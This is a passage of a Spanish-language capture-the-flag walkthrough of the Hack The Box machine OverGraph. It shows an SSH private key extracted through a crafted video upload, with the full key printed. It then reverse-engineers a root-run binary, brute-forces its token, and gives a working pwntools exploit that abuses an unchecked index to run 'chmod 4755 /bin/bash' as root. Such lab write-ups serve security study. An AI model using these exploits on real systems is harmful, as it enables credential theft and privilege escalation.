internal-api.graph.htb/api/register -d '{' -sH 'Content-Type: application/json' | grep -oE '/home.*?:' /home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js: /home/user/onegraph/backend/node_modules/body-parser/lib/read.js: /home/user/onegraph/backend/node_modules/raw-body/index.js: /home/user/onegraph/backend/node_modules/raw-body/index.js: /home/user/onegraph/backend/node_modules/raw-body/index.js:  Vale, entonces user es un usuario válido. En este punto, podemos obtener la flag user.txt usando la subida de archivos de vídeo:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [] \"GET ?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1\" 301 - ::ffff:10.10.11.157 - - [] \"GET ?09753d50eb14c51fc58b94afb5eedcc3/?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1\" 301 - ...  Para ganar acceso a la máquina, tenemos que extraer el archivo /home/user/.ssh/id_rsa:\n$ python3 -m http.server 80 Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] \"GET /header.m3u8 HTTP/1.1\" 200 - ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] code 400, message Bad request syntax ('GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1') ::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] \"GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1\" 400 -  Como va a ser muy aburrido extraer el archivo entero de forma manual, es mejor usar un script en Python para automatizarlo: extract_id_rsa.py (explicación detallada aquí):\n$ python3 extract_file.py 10.10.17.44 c0b9db4c8e4bbb24d59a3aaffa8c8b83 * Serving Flask app 'extract_file' (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: on * Running on all addresses (0.0.0.0) WARNING: This is a development server. Do not use it in a production deployment. * Running on http://0.0.0.0:80 (Press CTRL+C to quit) * Restarting with stat * Debugger is active! * Debugger PIN: XXX-XXX-XXX 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /?d=3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] \"GET /header.m3u8 HTTP/1.1\" 200 - 10.10.11.157 - - [] code 400, message Bad request syntax ('GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1') 10.10.11.157 - - [] \"GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1\" HTTPStatus.BAD_REQUEST - ^C $ cat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd 1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== -----END OPENSSH PRIVATE KEY-----  Enumeración del sistema Y ahora tenemos acceso a la máquina mediante SSH:\n$ chmod 600 id_rsa $ ssh -i id_rsa user@10.10.11.157 user@overgraph:~$ cat user.txt 09753d50eb14c51fc58b94afb5eedcc3  Al analizar procesos en ejecución como root, vemos uno extraño:\nuser@overgraph:~$ ps -faux | grep root ... root 8623 0.0 0.0 0 0 ? I 14:41 0:00 \\_ [kworker/0:2-events] root 8656 0.0 0.0 0 0 ? I 14:45 0:00 \\_ [kworker/u256:0-events_power_efficient] root 1 0.0 0.2 103796 11208 ? Ss Jul31 0:04 /sbin/init maybe-ubiquity root 491 0.0 0.4 67848 16268 ? S\u0026lt;s Jul31 0:01 /lib/systemd/systemd-journald root 517 0.0 0.1 21368 5436 ? Ss Jul31 0:01 /lib/systemd/systemd-udevd root 662 0.0 0.4 214596 17944 ? SLsl Jul31 0:06 /sbin/multipathd -d -s root 705 0.0 0.2 47540 10608 ? Ss Jul31 0:00 /usr/bin/VGAuthService root 710 0.1 0.2 311508 8332 ? Ssl Jul31 0:58 /usr/bin/vmtoolsd root 711 0.0 0.1 99896 5804 ? Ssl Jul31 0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 root 756 0.0 0.2 239276 9268 ? Ssl Jul31 0:01 /usr/lib/accountsservice/accounts-daemon root 780 0.0 0.0 81956 3788 ? Ssl Jul31 0:02 /usr/sbin/irqbalance --foreground root 787 0.0 0.1 16660 7756 ? Ss Jul31 0:00 /lib/systemd/systemd-logind root 788 0.0 0.3 394876 13472 ? Ssl Jul31 0:00 /usr/lib/udisks2/udisksd root 815 0.0 0.2 236416 9100 ? Ssl Jul31 0:00 /usr/lib/policykit-1/polkitd --no-debug root 932 0.0 0.0 6812 2996 ? Ss Jul31 0:00 /usr/sbin/cron -f root 933 0.0 0.0 8480 3384 ? S Jul31 0:00 \\_ /usr/sbin/CRON -f root 934 0.0 0.0 8480 3384 ? S Jul31 0:00 \\_ /usr/sbin/CRON -f root 935 0.0 0.0 8352 3356 ? S Jul31 0:00 \\_ /usr/sbin/CRON -f root 949 0.0 0.0 2608 536 ? Ss Jul31 0:00 \\_ /bin/sh -c sh -c 'socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr' root 950 0.0 0.0 2608 536 ? S Jul31 0:00 \\_ sh -c socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr root 951 0.0 0.0 6964 1828 ? S Jul31 0:00 \\_ socat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr root 964 0.0 0.1 12172 7324 ? Ss Jul31 0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups root 8687 0.0 0.2 13660 8772 ? Ss 14:46 0:00 \\_ sshd: user [priv] user 8804 0.0 0.0 6300 656 pts/0 S+ 14:48 0:00 \\_ grep --color=auto root root 966 0.0 0.0 55276 1564 ? Ss Jul31 0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; root 970 0.0 0.0 5828 1824 tty1 Ss+ Jul31 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 981 0.0 0.1 6532 5004 ? Ss Jul31 0:02 /usr/sbin/apache2 -k start  Se trata de este comando:\nsocat tcp4-listen:9851,reuseaddr,fork,bind=127.0.0.1 exec:/usr/local/bin/Nreport/nreport,pty,stderr  El comando ejecuta un archivo binario en /usr/local/bin/Nreport/nreport:\nuser@overgraph:~$ file /usr/local/bin/Nreport/nreport /usr/local/bin/Nreport/nreport: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/local/bin/Nreport/libc/ld-2.25.so, for GNU/Linux 3.2.0, BuildID[sha1]=fab56bbb7a23ada8a8f5943b527d16f3cdcb09e5, not stripped user@overgraph:~$ ls -l /usr/local/bin/Nreport/nreport -rwxr-xr-x 1 root root 26040 Feb 14 12:30 /usr/local/bin/Nreport/nreport  Es muy probable que tengamos que explotar este binario para convertirnos en root. Vamos a descargar el binario para analizarlo con Ghidra:\nuser@overgraph:~$ cd /usr/local/bin/Nreport/ user@overgraph:/usr/local/bin/Nreport$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [] \"GET /nreport HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  $ wget -q 10.10.11.157:8000/nreport  Además, sería bueno descargar las librerías compartidas usadas por el binario para tener el mismo entorno de trabajo que en la máquina remota:\nuser@overgraph:/usr/local/bin/Nreport$ ll total 40 drwxr-xr-x 3 root root 4096 Apr 12 17:38 ./ drwxr-xr-x 3 root root 4096 Apr 12 17:38 ../ drwxr-xr-x 2 root root 4096 Feb 14 18:31 libc/ -rwxr-xr-x 1 root root 26040 Feb 14 12:30 nreport* user@overgraph:/usr/local/bin/Nreport$ ll libc/ total 31716 drwxr-xr-x 2 root root 4096 Feb 14 18:31 ./ drwxr-xr-x 3 root root 4096 Apr 12 17:38 ../ -rwxr-xr-x 1 root root 1250280 Feb 13 14:17 ld-2.25.so* -rwxr-xr-x 1 root root 1250280 Feb 13 14:17 ld.so.2* -rwxr-xr-x 1 root root 14979184 Feb 14 18:29 libc-2.25.so* -rwxr-xr-x 1 root root 14978536 Feb 13 14:17 libc.so.6* user@overgraph:/usr/local/bin/Nreport$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.17.44 - - [01/Aug/2022 15:36:57] \"GET /libc/libc.so.6 HTTP/1.1\" 200 - 10.10.17.44 - - [01/Aug/2022 15:37:18] \"GET /libc/libc-2.25.so HTTP/1.1\" 200 - 10.10.17.44 - - [01/Aug/2022 15:37:43] \"GET /libc/ld-2.25.so HTTP/1.1\" 200 - 10.10.17.44 - - [01/Aug/2022 15:37:48] \"GET /libc/ld.so.2 HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting.  $ mkdir libc $ cd libc $ wget -q 10.10.11.157:8000/libc/{libc.so.6,libc-2.25.so,ld.so.2,ld-2.25.so}  Usando pwninit, podemos parchear el binario de manera que use la librería compartida y el loader que le indiquemos:\n$ pwninit --libc libc/libc.so.6 --ld libc/ld.so.2 --bin nreport --no-template bin: nreport libc: libc/libc.so.6 ld: libc/ld.so.2 warning: failed detecting libc version (is the libc an Ubuntu glibc?): failed finding version string copying nreportto nreport_patched running patchelf on nreport_patched  Analizando el binario nreport Esta es la función main:\nvoidmain() { intiVar1; longin_FS_OFFSET; charoption[3]; undefined8 canary;  canary =*(undefined8 *) (in_FS_OFFSET +0x28); puts(\"Custom Reporting v1\\n\"); auth(); printf(\"\\nWelcome %s\", userinfo1); do{ puts(\"\\n1.Create New Message\\n2.Delete a Message\\n3.Edit Messages\\n4.Report All Messages\\n5.Exit\"); printf(\"\u0026gt; \"); __isoc99_scanf(\" %1[^\\n]\", option); iVar1 =atoi(option); switch(iVar1) { case1: create(); break; case2: delete(); break; case3: edit(); break; case4: report(); break; case5: system(userinfo1 +0x28); /* WARNING: Subroutine does not return */ exit(0); } } while(true); }  Lo primer que hace es llamar a auth y solicitar un token:\nuser@overgraph:/usr/local/bin/Nreport$ ./nreport Custom Reporting v1 Enter Your Token: 1234 Invalid Token  Esta es la función auth:\nvoidauth() { size_tsVar1; longin_FS_OFFSET; inti; undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); local_48 =0; local_40 =0; local_38 =0; local_30 =0; local_28 =0; local_20 =0; local_18 =0; printf(\"Enter Your Token: \"); fgets(userinfo1 +0x78, 19, stdin); sVar1 =strlen(userinfo1 +0x78); if(sVar1 !=15) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } for(i =13; -1\u0026lt;i; i =i +-1) { *(uint*) ((long) \u0026amp;local_48 +(long) i *4) = *(uint*) (secret +(long) i *4) ^(int) userinfo1[121] ^(int) userinfo1[122] ^ (int) userinfo1[120] ^(int) userinfo1[129] ^(int) userinfo1[133]; } if((int) local_40 +(int) local_48 +local_48._4_4_ !=0x134) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_28._4_4_ +local_30._4_4_ +(int) local_28 !=0x145) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_18._4_4_ +local_20._4_4_ +(int) local_18 !=0x109) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } printf(\"Enter Name: \"); __isoc99_scanf(\" %39[^\\n]\", userinfo1); userinfo1._140_8_ =0x7672632f74706f2f; userinfo1._148_2_ =0x2f31; userinfo1[150] =0; strcat(userinfo1 +0x8c, userinfo1); userinfo1._40_8_ =0x614c22206f686365; userinfo1._48_8_ =0x2064657355207473; userinfo1._56_8_ =0x7461642824206e4f; userinfo1._64_8_ =0x2f203e3e20222965; userinfo1._72_8_ =0x2f676f6c2f726176; userinfo1._80_8_ =0x74726f7065726b; if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } userinfo1._40_8_ =0x614c22206f686365; userinfo1._48_8_ =0x2064657355207473; userinfo1._56_8_ =0x7461642824206e4f; userinfo1._64_8_ =0x2f203e3e20222965; userinfo1._72_8_ =0x2f676f6c2f726176; userinfo1._80_8_ =0x74726f7065726b; return; }  Lo primero que necesitamos es construir un token que pase todas las comprobaciones:\nprintf(\"Enter Your Token: \"); fgets(userinfo1 +120, 19, stdin); sVar1 =strlen(userinfo1 +120); if(sVar1 !=15) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } for(i =13; -1\u0026lt;i; i =i +-1) { *(uint*) ((long) \u0026amp;local_48 +(long) i *4) = *(uint*) (secret +(long) i *4) ^(int) userinfo1[121] ^(int) userinfo1[122] ^ (int) userinfo1[120] ^(int) userinfo1[129] ^(int) userinfo1[133]; } if((int) local_40 +(int) local_48 +local_48._4_4_ !=0x134) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_28._4_4_ +local_30._4_4_ +(int) local_28 !=0x145) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); } if(local_18._4_4_ +local_20._4_4_ +(int) local_18 !=0x109) { puts(\"Invalid Token\"); /* WARNING: Subroutine does not return */ exit(0); }  La primera comprobación es que la longitud del token sea 15 bytes, lo cual es fácil. Bueno, realmente 14, porque el último byte será el carácter de salto de línea (\\n).\nLuego, el programa realiza operaciones XOR con una variable secret y algunos de los bytes introducidos. De hecho, estos bytes son userinfo1[120], userinfo1[121], userinfo1[122], userinfo1[129] y userinfo1[133]. El resto de los bytes no afectan. Por esta razón, podemos emplear un ataque de fuerza bruta sobre estos 5 bytes hasta que encontremos un token válido (hay varios). Para ello, escribí un script sencillo en Python usando pwntools: bf_token.py (explicación detallada aquí):\n$ python3 bf_token.py [*] './nreport_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b'./libc' [+] Valid token: hD]AAAAAAVAAAT $ ./nreport_patched Custom Reporting v1 Enter Your Token: hD]AAAAAAVAAAT Enter Name: asdf Welcome asdf 1.Create New Message 2.Delete a Message 3.Edit Messages 4.Report All Messages 5.Exit \u0026gt;  Estrategia de explotación Ahora llegamos al menú que vimos en el main. Parece a un reto típico de explotación del heap.\nDe hecho, si analizamos las funciones create, delete y edit, todas usan calloc y free, por lo que estamos trabajando en el espacio de direcciones del heap:\nvoidcreate() { void*pvVar1;  printf(\"\\nYou can only create 10 messages at a time\\nMessages Created: %i\\n\\n\", (ulong) Arryindex); pvVar1 =calloc(1, 0xa1); printf(\"Message Title: \"); __isoc99_scanf(\" %59[^\\n]\", pvVar1); printf(\"Message: \"); __isoc99_scanf(\" %100[^\\n]\", (long) pvVar1 +0x3c); *(void**) (message_array +(long) (int) Arryindex *8) =pvVar1; Arryindex =Arryindex +1; return; }  voiddelete() { longin_FS_OFFSET; intindex; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); printf(\"Message number to delete: \"); __isoc99_scanf(\"%d[^\\n]\", \u0026amp;index); free(*(void**) (message_array +(long) index *8)); Arryindex =Arryindex -1; puts(\"\\nMessage Deleted\"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  voidedit() { longin_FS_OFFSET; intindex; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); if(Arryindex ==0) { puts(\"No Message Created\"); } else{ printf(\"Enter number to edit: \"); __isoc99_scanf(\"%d[^\\n]\", \u0026amp;index); printf(\"Message Title: \"); __isoc99_scanf(\" %59[^\\n]\", *(undefined8 *) (message_array +(long) index *8)); printf(\"Message: \"); __isoc99_scanf(\"%100[^\\n]\", *(long*) (message_array +(long) index *8) +0x3c); fflush(stdin); fflush(stdout); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Sin embargo, no se puede hacer mucho con un exploit de heap en este caso. Aunque sí se puede realizar un ataque de Unsorted Bin, no podemos escalarlo a algo más crítico o sería muy difícil de realizar. Este ataque es posible porque podemos editar chunks liberados y modificar el puntero bk, de manera que al asignar un nuevo chunk, una dirección de main_arena se escribe en la dirección que aparece en bk (más información en Nightmare). Puedes olvidar esto último si no lo entendiste, no hará falta.\nUn exploit que funcione para este binario no tiene que ver con el heap. De hecho, vamos a mirar la función edit más detenidamente:\nprintf(\"Enter number to edit: \"); __isoc99_scanf(\"%d[^\\n]\", \u0026amp;index); printf(\"Message Title: \"); __isoc99_scanf(\" %59[^\\n]\", *(undefined8 *) (message_array +(long) index *8));  ¿Puedes ver el bug? Sí, el programa pregunta por un índice y luego lo utiliza como offset para calcular la dirección donde escribir (message_array + index * 8). Como no hay validación sobre este índice, podemos controlar dónde escribimos (esto es lo que se conoce como primitiva write-what-where). Vamos a mirar las variables que aparecen en auth después de poner el token válido:\n$ gdb -q ./nreport_patched Reading symbols from ./nreport_patched... (No debugging symbols found in ./nreport_patched) gef➤ run Starting program: /home/rocky/Desktop/HTB/Machines/OverGraph/nreport_patched Custom Reporting v1 Enter Your Token: hD]AAAAAAVAAAT Enter Name: asdf Welcome asdf 1.Create New Message 2.Delete a Message 3.Edit Messages 4.Report All Messages 5.Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7b18ad0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84 84 ../sysdeps/unix/syscall-template.S: No such file or directory.  Por ejemplo, tenemos una variable global llamada userinfo1, que está referenciada como userinfo1, userinfo1 + 40, userinfo1 + 0x78 y userinfo1 + 140:\ngef➤ x/s (char *) \u0026userinfo1 0x404180 \u0026lt;userinfo1\u0026gt;: \"asdf\" gef➤ x/s (char *)\u0026userinfo1+40 0x4041a8 \u0026lt;userinfo1+40\u0026gt;: \"echo \\\"Last Used On $(date)\\\" \u0026gt;\u0026gt; /var/log/kreport\" gef➤ x/s (char *) \u0026userinfo1 + 0x78 0x4041f8 \u0026lt;userinfo1+120\u0026gt;: \"hD]AAAAAAVAAAT\\n\" gef➤ x/s (char *) \u0026userinfo1 + 140 0x40420c \u0026lt;userinfo1+140\u0026gt;: \"/opt/crv1/asdf\"  Aquí tenemos algunas cosas interesantes:\n La cadena \u0026quot;asdf\u0026quot; (nuestro nombre) es algo que podemos controlar La cadena \u0026quot;echo \\\u0026quot;Last Used On $(date)\\\u0026quot; \u0026gt;\u0026gt; /var/log/kreport\u0026quot; se utiliza como comando de sistema y se ejecuta antes de salir con la opción 5 La cadena \u0026quot;/opt/crv1/asdf\u0026quot; será el archivo utilizado por la función report para guardar nuestros mensajes  Además, estas son las direcciones de message_array:\ngef➤ x/40gx \u0026message_array 0x404120 \u0026lt;message_array\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404130 \u0026lt;message_array+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404140 \u0026lt;message_array+32\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404150 \u0026lt;message_array+48\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404160 \u0026lt;message_array+64\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180 \u0026lt;userinfo1\u0026gt;: 0x0000000066647361 0x0000000000000000 0x404190 \u0026lt;userinfo1+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041a0 \u0026lt;userinfo1+32\u0026gt;: 0x0000000000000000 0x614c22206f686365 0x4041b0 \u0026lt;userinfo1+48\u0026gt;: 0x2064657355207473 0x7461642824206e4f 0x4041c0 \u0026lt;userinfo1+64\u0026gt;: 0x2f203e3e20222965 0x2f676f6c2f726176 0x4041d0 \u0026lt;userinfo1+80\u0026gt;: 0x0074726f7065726b 0x0000000000000000 0x4041e0 \u0026lt;userinfo1+96\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041f0 \u0026lt;userinfo1+112\u0026gt;: 0x0000000000000000 0x41414141415d4468 0x404200 \u0026lt;userinfo1+128\u0026gt;: 0x000a544141415641 0x74706f2f00000000 0x404210 \u0026lt;userinfo1+144\u0026gt;: 0x73612f317672632f 0x0000000000006664 0x404220 \u0026lt;userinfo1+160\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404230: 0x0000000000000000 0x0000000000000000 0x404240: 0x0000000000000000 0x0000000000000000 0x404250: 0x0000000000000000 0x0000000000000000  De momento, vamos a crear un mensaje:\ngef➤ continue Continuing. 1 You can only create 10 messages at a time Messages Created: 0 Message Title: AAAA Message: BBBB 1.Create New Message 2.Delete a Message 3.Edit Messages 4.Report All Messages 5.Exit \u0026gt; ^C Program received signal SIGINT, Interrupt. 0x00007ffff7b18ad0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84 84 in ../sysdeps/unix/syscall-template.S  Ahora, si imprimimos el contenido de message_array, vemos una dirección (0x405830):\ngef➤ x/40gx \u0026message_array 0x404120 \u0026lt;message_array\u0026gt;: 0x0000000000405830 0x0000000000000000 0x404130 \u0026lt;message_array+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404140 \u0026lt;message_array+32\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404150 \u0026lt;message_array+48\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404160 \u0026lt;message_array+64\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180 \u0026lt;userinfo1\u0026gt;: 0x0000000066647361 0x0000000000000000 0x404190 \u0026lt;userinfo1+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041a0 \u0026lt;userinfo1+32\u0026gt;: 0x0000000000000000 0x614c22206f686365 0x4041b0 \u0026lt;userinfo1+48\u0026gt;: 0x2064657355207473 0x7461642824206e4f 0x4041c0 \u0026lt;userinfo1+64\u0026gt;: 0x2f203e3e20222965 0x2f676f6c2f726176 0x4041d0 \u0026lt;userinfo1+80\u0026gt;: 0x0074726f7065726b 0x0000000000000000 0x4041e0 \u0026lt;userinfo1+96\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4041f0 \u0026lt;userinfo1+112\u0026gt;: 0x0000000000000000 0x41414141415d4468 0x404200 \u0026lt;userinfo1+128\u0026gt;: 0x000a544141415641 0x74706f2f00000000 0x404210 \u0026lt;userinfo1+144\u0026gt;: 0x73612f317672632f 0x0000000000006664 0x404220 \u0026lt;userinfo1+160\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404230: 0x0000000000000000 0x0000000000000000 0x404240: 0x0000000000000000 0x0000000000000000 0x404250: 0x0000000000000000 0x0000000000000000  Y esta dirección contiene nuestro mensaje (como chunk en el heap):\ngef➤ x/30gx 0x0000000000405830 - 0x10 0x405820: 0x0000000000000000 0x00000000000000b1 0x405830: 0x0000000041414141 0x0000000000000000 0x405840: 0x0000000000000000 0x0000000000000000 0x405850: 0x0000000000000000 0x0000000000000000 0x405860: 0x0000000000000000 0x4242424200000000 0x405870: 0x0000000000000000 0x0000000000000000 0x405880: 0x0000000000000000 0x0000000000000000 0x405890: 0x0000000000000000 0x0000000000000000 0x4058a0: 0x0000000000000000 0x0000000000000000 0x4058b0: 0x0000000000000000 0x0000000000000000 0x4058c0: 0x0000000000000000 0x0000000000000000 0x4058d0: 0x0000000000000000 0x0000000000020731 0x4058e0: 0x0000000000000000 0x0000000000000000 0x4058f0: 0x0000000000000000 0x0000000000000000 0x405900: 0x0000000000000000 0x0000000000000000  Al utilizar la función edit, el programa espera que pongamos un índice. Y la dirección en la que escribe se calcula como message_array + index * 8. Como el binario no cuenta con la protección PIE, message_array tendrá una dirección fija (0x404120). Por tanto, la dirección objetivo será 0x404120 + index * 8.\nComo podemos controlar lo que ponemos de nombre de usuario (guardado en userinfo1, 0x404180), podemos introducir aquí una dirección en la que queremos escribir. Y para decirle al programa que use nuestro nombre de usuario como dirección, tenemos que usar 12 como índice (12 = (0x404180 - 0x404120) / 8). Vamos a probarlo ahora mismo:\ngef➤ continue Continuing. 3 Enter number to edit: 12 Message Title: XXXX Program received signal SIGSEGV, Segmentation fault. 0x00007ffff7a95f5f in _IO_vfscanf_internal (s=\u0026lt;optimized out\u0026gt;, format=\u0026lt;optimized out\u0026gt;, argptr=argptr@entry=0x7fffffffe578, errp=errp@entry=0x0) at vfscanf.c:2 892 2892 vfscanf.c: No such file or directory.  Obtenemos una violación de segmento (segmentation fault), porque el programa está tratando de escribir XXXX en la dirección 0x66647361 (asdf en formato hexadecimal, little-endian):\ngef➤ x/i $rip =\u0026gt; 0x7ffff7a95f5f \u0026lt;_IO_vfscanf_internal+12911\u0026gt;: mov BYTE PTR [r14],r8b gef➤ p $r14 $1 = 0x66647361 gef➤ p $r8 $2 = 0x58  Escalada de privilegios Entonces podemos modificar datos arbitrarios en la memoria. Aquí tenemos muchas posibilidades. Una es modificar el comando que está guardado en userinfo1 + 40:\necho\"Last Used On $(date)\"\u0026gt;\u0026gt;/var/log/kreport  Lo podemos cambiar a chmod 4755 /bin/bash, por ejemplo. Como el proceso está corriendo como root, el comando será ejecutado por root. Para hacer esto, el nombre de usuario tiene que ser la dirección de userinfo1 + 40 (0x404180 + 40 = 0x4041a8). Luego, podemos usar un script sencillo con pwntools para realizar el exploit (exploit_rce.py):\n#!/usr/bin/env python3 frompwnimportcontext, log, p64, remote, sys context.binary='nreport_patched' defmain(): token=b'hD]AAAAAAVAAAT' iflen(sys.argv) !=3: log.error(f'Usage: python3 {sys.argv[0]}\u0026lt;ip\u0026gt; \u0026lt;port\u0026gt;') host, port=sys.argv[1], sys.argv[2] p=remote(host, int(port)) p.sendlineafter(b'Enter Your Token: ', token) p.sendlineafter(b'Enter Name: ', p64(context.binary.sym.userinfo1 +40)) p.sendlineafter(b'\u0026gt; ', b'1') p.sendlineafter(b'Message Title: ', b'AAAA') p.sendlineafter(b'Message: ', b'BBBB') p.sendlineafter(b'\u0026gt; ', b'3') p.sendlineafter(b'Enter number to edit: ', b'12') p.sendlineafter(b'Message Title: ', b'chmod 4755 /bin/bash\\0') p.sendlineafter(b'\u0026gt; ', b'5') p.close() if__name__=='__main__': main()  Nótese que el binario está corriendo en local con socat en 127.0.0.1:9851, por lo que necesitamos hacer un reenvío de puertos a nuestra máquina de atacante. Esto se puede hacer con SSH (ENTER + ~C para acceder a la interfaz ssh\u0026gt;):\nuser@overgraph:/usr/local/bin/Nreport$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash user@overgraph:/usr/local/bin/Nreport$ ssh\u0026gt; -L 9851:127.0.0.1:9851 Forwarding port. user@overgraph:/usr/local/bin/Nreport$  Y ahora lanzamos el exploit:\n$ python3 exploit_rce.py 127.0.0.1 9851 [*] './nreport_patched' 